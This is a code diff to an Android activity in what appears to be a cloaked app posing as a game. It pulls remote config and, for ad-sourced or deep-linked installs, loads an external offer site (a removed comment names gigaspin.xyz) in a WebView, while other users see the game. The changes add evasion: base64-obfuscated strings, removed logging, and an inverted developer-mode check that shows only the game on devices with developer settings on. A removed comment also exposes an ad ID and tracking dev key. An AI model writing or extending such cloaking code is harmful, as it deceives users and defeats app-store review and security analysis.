@@ -11,8 +11,9 @@ import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
-import android.util.Log;
+import android.os.Handler;
 import android.view.View;
+import android.view.Window;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
@@ -23,8 +24,6 @@ import android.widget.ProgressBar;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 
-
-
 import java.io.IOException;
 
 import okhttp3.ResponseBody;
@@ -34,6 +33,7 @@ import retrofit2.Response;
 import retrofit2.Retrofit;
 
 public class ER extends AppCompatActivity {
+    private ProgressBar progressBar;
     private WebView webViewetgpy;
     private String linketgpy;
     private Uri[] resultsetgpy;
@@ -51,11 +51,12 @@ public class ER extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        requestWindowFeature(Window.FEATURE_NO_TITLE);
         setContentView(R.layout.activity_main);
-        ProgressBar progressBar = (ProgressBar) findViewById(R.id.progressBar);
+        progressBar = (ProgressBar) findViewById(R.id.progressBar);
         progressBar.setVisibility(ProgressBar.VISIBLE);
 
-        if ( ! ifDevMode()) {    // TODO delete !
+        if ( ! devModeOff()) {
 
             webViewetgpy = findViewById(R.id.webView);
             setWebViewetgpy(webViewetgpy);
@@ -75,25 +76,25 @@ public class ER extends AppCompatActivity {
                             offeretgpy = params[0];
                             keyDefaultetgpy = params[1];
                             fbIdetgpy = params[2];
-                            Log.i("MyApp", "gistString = " + url);
-
                             new F_B_K(fbIdetgpy, ER.this);
 
                             sPrefsetgpy = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                             linketgpy = sPrefsetgpy.getString(URLPRFSetgpy, null);
 
-                            // TODO uncomment
-
-                            Log.i("MyApp", "linketgpy " + linketgpy);
 
                             if (linketgpy != null) {
                                 webViewetgpy.loadUrl(linketgpy);
-                            progressBar.setVisibility(ProgressBar.INVISIBLE);
+                                progressBar.setVisibility(ProgressBar.INVISIBLE);
                             } else {
                                 do {
                                 } while (!afLoaded);
-                                startWebView(offeretgpy);
-                                progressBar.setVisibility(ProgressBar.INVISIBLE);
+                                new Handler().postDelayed(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        startWebView(offeretgpy);
+                                        progressBar.setVisibility(ProgressBar.INVISIBLE);
+                                    }
+                                }, 2000);
                             }
 
 
@@ -101,13 +102,13 @@ public class ER extends AppCompatActivity {
                             e.printStackTrace();
                         }
                     } else {
-                        Log.i("MyApp", "fail Gist request");
+                        goToGame();
                     }
                 }
 
                 @Override
                 public void onFailure(Call<ResponseBody> call, Throwable t) {
-                    Log.i("MyApp", "Network Error :: " + t.getLocalizedMessage());
+                    goToGame();
                 }
             });
 
@@ -125,22 +126,16 @@ public class ER extends AppCompatActivity {
 
     void startWebView(String link) {
 
-        if (statusAppsFlyeretgpy != null && statusAppsFlyeretgpy.equals("Non-organic")) {
+        if (statusAppsFlyeretgpy != null && statusAppsFlyeretgpy.equals(CNSTN.decode("Tm9uLW9yZ2FuaWM="))) {
             String url = link + strAppsFlyeretgpy;
-
-            Log.i("MyApp", "Non-organic:" + url);
             webViewetgpy.loadUrl(url);
         } else if (strDeepetgpy != null) {
             String url = link + strDeepetgpy;
-            Log.i("MyApp", "DeepLink" + url);
             webViewetgpy.loadUrl(url);
         } else {
             if (keyDefaultetgpy.equals("NO")) {
-                //органика выключена
-                Log.i("MyApp", "With out naming and deepLinks");
                 goToGame();
             } else {
-                //органика включена
                 strAppsFlyeretgpy =
                         keyDefaultetgpy
                                 + CNSTN.decode("P2J1bmRsZT0=") + getPackageName()
@@ -148,8 +143,6 @@ public class ER extends AppCompatActivity {
                                 + CNSTN.decode("JmFwcHNfaWQ9") + AFId
                                 + CNSTN.decode("JmRldl9rZXk9") + CNSTN.decode(CNSTN.LA_ED_RSEVQ_NFJGUERDYW);
                 String url = link + strAppsFlyeretgpy;
-                Log.i("MyApp", "Organic:" + url);
-                //E/User: Organic: https://gigaspin.xyz/Gp88Vp?bundle=com.fferss.fullapp&ad_id=590ec99f-f3df-4f93-9bd9-07e82d8f79e4&apps_id=1641395442394-6992958082334891642&dev_key=jhmwSMVcuZWmhQ3nVyj5S4
                 webViewetgpy.loadUrl(url);
             }
         }
@@ -177,11 +170,11 @@ public class ER extends AppCompatActivity {
         }
     }
 
-    private boolean ifDevMode() {
+    private boolean devModeOff() {
         int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                 android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
-        if (devInt == 0) return false;
-        return true;
+        if (devInt == 0) return true;
+        return false;
     }
 
 
@@ -205,6 +198,8 @@ public class ER extends AppCompatActivity {
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
             webViewetgpy.setVisibility(View.VISIBLE);
+            progressBar.setVisibility(ProgressBar.INVISIBLE);
+
             if (url.contains(CNSTN.decode("NDA0"))) {
                 goToGame();
                 finish();
@@ -217,9 +212,6 @@ public class ER extends AppCompatActivity {
             SharedPreferences.Editor editor = sPrefsetgpy.edit();
             editor.putString(URLPRFSetgpy, url);
             editor.apply();
-            Log.i("MyApp", "url:" + url);
-
-
         }
     }
 
